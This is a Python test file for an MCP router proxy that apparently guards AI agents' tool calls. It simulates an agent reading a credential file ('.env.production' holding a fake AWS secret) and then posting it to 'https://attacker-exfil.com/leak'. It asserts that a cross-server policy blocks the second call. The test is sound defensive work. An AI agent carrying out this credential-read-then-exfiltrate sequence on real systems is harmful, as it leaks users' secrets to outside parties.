from __future__ import annotations

import pytest
import asyncio
from unittest.mock import AsyncMock, patch

from agent_blackbox.config import BlackboxConfig, PolicyRule
from agent_blackbox.proxy.router_proxy import McpRouterProxy, UpstreamServer
from agent_blackbox.proxy.mcp_spec import JsonRpcRequest, JsonRpcResponse


@pytest.mark.asyncio
async def test_mcp_router_aggregates_tools_and_cross_server_security(tmp_path):
    cfg = BlackboxConfig(
        mode="enforce",
        audit={"db_path": str(tmp_path / "router_audit.db"), "key_dir": str(tmp_path / "keys")},
    )

    servers_def = {
        "fs_server": ["dummy_fs"],
        "network_server": ["dummy_net"],
    }
    router = McpRouterProxy(config=cfg, servers_config=servers_def)

    # Mock responses for Server A (Filesystem) and Server B (Network)
    mock_fs_tools = JsonRpcResponse(
        id=1,
        result={
            "tools": [
                {"name": "read_file", "description": "Reads local files", "inputSchema": {}}
            ]
        },
    )
    mock_net_tools = JsonRpcResponse(
        id=1,
        result={
            "tools": [
                {"name": "http_request", "description": "Makes external HTTP calls", "inputSchema": {}}
            ]
        },
    )

    router.upstreams["fs_server"].send_request = AsyncMock(return_value=mock_fs_tools)
    router.upstreams["network_server"].send_request = AsyncMock(return_value=mock_net_tools)

    # 1. Query aggregated tools/list
    list_req = JsonRpcRequest(id=1, method="tools/list")
    list_resp = await router.handle_request(list_req)

    assert list_resp.result is not None
    aggregated = list_resp.result["tools"]
    tool_names = [t["name"] for t in aggregated]
    assert "read_file" in tool_names
    assert "http_request" in tool_names
    assert len(aggregated) == 2

    # 2. Call tool on Server A to read sensitive credential file
    router.upstreams["fs_server"].send_request = AsyncMock(
        return_value=JsonRpcResponse(id=2, result={"content": "AWS_SECRET=supersecret"})
    )
    call_read_req = JsonRpcRequest(
        id=2,
        method="tools/call",
        params={"name": "read_file", "arguments": {"path": ".env.production"}},
    )
    resp_read = await router.handle_request(call_read_req)
    assert resp_read.error is None
    assert resp_read.result["content"] == "AWS_SECRET=supersecret"

    # 3. Call tool on Server B to make an outbound call to an unseen domain
    # MUST BE BLOCKED BY CROSS-SERVER POLICY INVARIANT!
    call_exfil_req = JsonRpcRequest(
        id=3,
        method="tools/call",
        params={"name": "http_request", "arguments": {"url": "https://attacker-exfil.com/leak"}},
    )
    resp_exfil = await router.handle_request(call_exfil_req)

    assert resp_exfil.error is not None
    assert resp_exfil.error.code == -32003
    assert "Cross-Server Security Block" in resp_exfil.error.message
    assert "Sequence violation" in resp_exfil.error.message
